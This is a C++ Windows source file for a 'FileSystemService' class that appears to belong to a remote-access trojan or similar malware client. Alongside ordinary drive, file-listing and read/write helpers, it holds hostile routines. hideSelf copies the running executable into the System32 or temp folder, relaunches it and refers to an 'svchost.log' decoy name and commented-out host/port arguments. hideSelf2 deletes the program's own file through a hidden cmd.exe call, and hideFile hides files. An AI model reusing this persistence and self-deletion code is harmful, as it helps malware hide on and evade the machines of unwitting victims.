#include "FileSystemService.h"
#include <cstdio>
#include <ShlObj.h>
#include <strsafe.h>
#include <tchar.h>

FileSystemService::FileSystemService()
{
}


FileSystemService::~FileSystemService()
{
}


std::vector<std::wstring> FileSystemService::GetLocicalDrivesW()
{
	const auto size = ::GetLogicalDriveStringsW(0, nullptr);
	auto buffer = std::make_unique<wchar_t[]>(size);

	::GetLogicalDriveStringsW(size, buffer.get());
	std::vector<std::wstring> drives = std::vector<std::wstring>();
	std::wstring current;
	for (unsigned int i = 0; i < size; ++i)
	{
		if (buffer[i])
		{
			current += buffer[i];
		}
		else
		{
			if (!current.empty())
			{
				drives.push_back(current);
				current.clear();
			}
		}
	}

	return drives;
}

void FileSystemService::hideFile(char* fileAbsolutePath)
{
	SetFileAttributesA(fileAbsolutePath, FILE_ATTRIBUTE_HIDDEN);
}


void FileSystemService::hideSelf()
{
	HMODULE h_mod;
	wchar_t* c_path[MAX_PATH];
	wchar_t futureExeAbsolutePath[MAX_PATH + FILENAME_MAX + 1];
	std::wstring currentProcessAbsolutePath;
	std::wstring currentProcessFolderPath;
	std::wstring currentProcessFileName;
	bool b_admin_access;
	TCHAR tmpAbsolutePath[MAX_PATH];
	TCHAR sysAbsolutePath[MAX_PATH];
	PCSTR str_host;
	PCSTR str_port;
	TCHAR c_temp_cmd[MAX_PATH + 20];
	TCHAR cmdAbsolutePath[MAX_PATH + 7];
#define						TMPLOG							"svchost.log"

	// Get handle of current Module
	h_mod = GetModuleHandleW(NULL);
	// Get absolute path of current process
	GetModuleFileNameW(h_mod, (wchar_t *)c_path, MAX_PATH);

	currentProcessAbsolutePath = (wchar_t *)c_path;
	currentProcessFileName = currentProcessAbsolutePath.substr(currentProcessAbsolutePath.find_last_of('\\') + 1);
	currentProcessFolderPath = currentProcessAbsolutePath.substr(0, currentProcessAbsolutePath.find_last_of('\\'));
	// Just the path of the executed location.

	GetTempPath(MAX_PATH, tmpAbsolutePath);
	GetSystemDirectory(sysAbsolutePath, MAX_PATH);

	// If folder where our exe is located is neither system nor tmp
	if (wcscmp(currentProcessAbsolutePath.c_str(), sysAbsolutePath) != 0 && (wcscmp(
		std::wstring(std::wstring(currentProcessAbsolutePath) + L"\\").c_str(),
		tmpAbsolutePath) != 0))
	{
		_stprintf_s(futureExeAbsolutePath, _T("%s\\%s"), sysAbsolutePath, currentProcessFileName.c_str());

		std::fstream fileInputStream(currentProcessAbsolutePath, std::ios::in | std::ios::binary);
		std::fstream fileOutputStream(futureExeAbsolutePath, std::ios::out | std::ios::binary);

		// Permission check
		if (fileOutputStream.good() || fileOutputStream.is_open())
		{
			// We can write into system folder
			fileOutputStream << fileInputStream.rdbuf();

			fileInputStream.close();
			fileOutputStream.close();
		}
		else
		{
			// Close File Output Stream to System Folder location
			fileOutputStream.close();

			// Write exe into world writeable folder (%TMP%)
			_stprintf_s(futureExeAbsolutePath, _T("%s%s"), tmpAbsolutePath, currentProcessFileName.c_str());
			fileOutputStream = std::fstream(futureExeAbsolutePath, std::ios::out | std::ios::binary);

			fileOutputStream << fileInputStream.rdbuf();

			fileInputStream.close();
			fileOutputStream.close();
		}

		wchar_t paramFormat[23];

		// sprintf(paramFormat, "%s %s", str_host, str_port);

		ShellExecuteW(NULL, L"open", futureExeAbsolutePath, paramFormat, 0, 0);
		exit(EXIT_SUCCESS);
	}


	_stprintf(c_temp_cmd, _T("%s%s"), tmpAbsolutePath, TMPLOG);
	_stprintf(cmdAbsolutePath, _T("%s\\cmd.exe"), sysAbsolutePath);

	// remove(c_temp_cmd); // Remove previous instance.
}

bool FileSystemService::hideSelf2()
{
	SHELLEXECUTEINFO sei;

	TCHAR szModule[MAX_PATH], szComspec[MAX_PATH], szParams[MAX_PATH];

	if ((GetModuleFileNameW(0, szModule, MAX_PATH) != 0) && (GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariableW(L"COMSPEC", szComspec, MAX_PATH) != 0))
	{
		lstrcpyW(szParams, L"/c del ");
		lstrcatW(szParams, szModule);
		lstrcatW(szParams, L" > nul");

		sei.cbSize = sizeof(sei);
		sei.hwnd = 0;
		sei.lpVerb = L"Open";
		sei.lpFile = szComspec;
		sei.lpParameters = szParams;
		sei.lpDirectory = 0;
		sei.nShow = SW_HIDE;
		sei.fMask = SEE_MASK_NOCLOSEPROCESS;

		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		if (ShellExecuteEx(&sei))
		{
			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
			SetProcessPriorityBoost(sei.hProcess, TRUE);

			SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);
			return true;
		}
		else
		{
			SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
		}
	}
	return true;
}

bool FileSystemService::fileExists(const char* fileAbsolutePath)
{
	std::ifstream inputStream(fileAbsolutePath);
	return inputStream.good();
}

std::ifstream::pos_type FileSystemService::getFileSize(const char* filename)
{
	std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
	return in.tellg();
}

std::ifstream::pos_type FileSystemService::getFileSize(const std::wstring& filename)
{
	std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
	return in.tellg();
}

void FileSystemService::readBinaryFile(const wchar_t* fileName, void* buffer, DWORD bufferLen)
{
	DWORD bytesRead; // receives size of the buffer in bytes	
	const HANDLE hFile = CreateFileW(fileName, GENERIC_READ, FILE_SHARE_READ, NULL,
	                                 OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		const ULONG fileSize = GetFileSize(hFile, NULL);

		// const PVOID Blob = static_cast<PVOID>(malloc(fileSize + sizeof(CHAR)));

		if (ReadFile(hFile, buffer, bufferLen, &bytesRead, NULL))
		{
			if (fileSize < bytesRead)
				bytesRead = fileSize;
		}
	}
	CloseHandle(hFile);
}

bool FileSystemService::writeBinaryFile(const wchar_t* fileName, void* binaryData, ULONGLONG binaryDataLen)
{
	bool success = false;

	DeleteFileW(fileName);
	const HANDLE hFile = CreateFileW(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL,
	                                 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		ULONG bytesWritten;
		if (WriteFile(hFile, binaryData, binaryDataLen, &bytesWritten, NULL))
			success = TRUE;

		CloseHandle(hFile);
	}

	return success;
}

char* FileSystemService::getDesktopPath()
{
	char* path;
	path = new char[MAX_PATH + 1];
	if (SHGetSpecialFolderPathA(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE))
		return path;
	else
		return nullptr;
}

wchar_t* FileSystemService::getWindirNot()
{
	TCHAR pf[MAX_PATH];
	SHGetSpecialFolderPathW(0, pf, CSIDL_COMMON_MUSIC, FALSE);

	std::wstring test(&pf[0]);
	std::wstring test2(test.begin(), test.end());
	wchar_t* path = _wcsdup(test2.c_str());
	return path;
}

bool FileSystemService::isDirectoryExisting(const std::wstring& file)
{
	DWORD result = GetFileAttributesW(file.c_str());
	if (result == (DWORD)-1)
		return false;
	return true;
}

/*static*/
bool FileSystemService::fileExists(const std::wstring& file)
{
	std::wifstream ifile(file.c_str());

	if (ifile.is_open())
	{
		ifile.close();
		return true;
	}
	return false;
}

bool FileSystemService::deleteDir(const wchar_t* path)
{
	bool result = true;
	WIN32_FIND_DATAW findFileData;
	HANDLE hFind;
	DWORD attributes;
	wchar_t str[MAX_PATH];
	wcscpy(str, path);
	wcscat(str, L"\\*.*");
	hFind = FindFirstFileW(str, &findFileData);
	do
	{
		if (wcscmp(findFileData.cFileName, L".") != 0
			&& wcscmp(findFileData.cFileName, L"..") != 0)
		{
			wcscpy(str, path);
			wcscat(str, L"\\");
			wcscat(str, findFileData.cFileName);
			attributes = GetFileAttributesW(str);
			if (attributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				// Is directory
				if (!deleteDir(str))
				{
					result = false;
					break;
				}
			}
			else
			{
				// Is file
				if (!DeleteFileW(str))
				{
					result = false;
					break;
				}
			}
		}
	}
	while (FindNextFileW(hFind, &findFileData));
	FindClose(hFind);
	RemoveDirectoryW(path);
	return result;
}

void FileSystemService::listRoots(std::vector<FileInfo>& roots)
{
	std::vector<std::wstring> drives = GetLocicalDrivesW();
	for (auto&& drive : drives)
	{
		DWORD pflags = 0;
		wchar_t fsType[MAX_PATH + 1] = {0};

		const wchar_t* driveLetter = drive.c_str();
		FileInfo fileInfo = {};
		UINT attrs = GetDriveTypeW(drive.c_str());
		fileInfo.dwFileAttributes = attrs;


		fileInfo.path = drive;
		if (GetVolumeInformationW(driveLetter, NULL,
		                          _ARRAYSIZE(driveLetter), NULL,
		                          NULL, &pflags, fsType,
		                          _ARRAYSIZE(fsType)))
		{
			if (pflags & FILE_READ_ONLY_VOLUME)
				fileInfo.path.append(L"\tro");
			else
				fileInfo.path.append(L"\trw");
			if (pflags & FILE_VOLUME_IS_COMPRESSED)
				fileInfo.path.append(L", compressed");
		}

		roots.push_back(fileInfo);
	}
}

void DisplayErrorBox(LPWSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and clean up

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
	                                  (lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(
		                                  TCHAR));
	StringCchPrintfW((LPTSTR)lpDisplayBuf,
	                 LocalSize(lpDisplayBuf) / sizeof(TCHAR),
	                 TEXT("%s failed with error %d: %s"),
	                 lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}

void FileSystemService::listFilesW(const std::wstring& path, std::vector<FileInfo>& files)
{
	WIN32_FIND_DATAW ffd;
	LARGE_INTEGER filesize;

	WCHAR szDir[MAX_PATH];
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;
	const wchar_t* origin = path.c_str();
	StringCchLengthW(origin, MAX_PATH, &length_of_arg);

	if (length_of_arg > (MAX_PATH - 3))
	{
		// Directory path too long
		return;
	}

	// Prepare string for use with FindFile functions.  First, copy the
	// string to a buffer, then append '\*' to the directory name.

	StringCchCopyW(szDir, MAX_PATH, origin);
	StringCchCatW(szDir, MAX_PATH, TEXT("\\*"));

	// Find the first file in the directory.

	hFind = FindFirstFileW(szDir, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		wchar_t errorMessage[] = L"FindFirstFile";
		DisplayErrorBox(errorMessage);
		// return dwError;
		return;
	}

	// List all the files in the directory with some info about them.
	do
	{
		if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0)
		{
			continue;
		}

		FileInfo file = {};
		file.dwFileAttributes = ffd.dwFileAttributes;

		file.path.append(origin).append(L"\\").append(ffd.cFileName);
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
		}
		else
		{
			filesize.LowPart = ffd.nFileSizeLow;
			filesize.HighPart = ffd.nFileSizeHigh;
			file.fileSize = filesize.QuadPart;
			file.fileSize = (static_cast<long long>(ffd.nFileSizeHigh) << 32) | ffd.nFileSizeLow;
		}

		files.push_back(file);
	}
	while (FindNextFileW(hFind, &ffd) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		wchar_t errorMessage[] = L"FindFirstFile";
		// DisplayErrorBox(errorMessage);
	}
	FindClose(hFind);
}
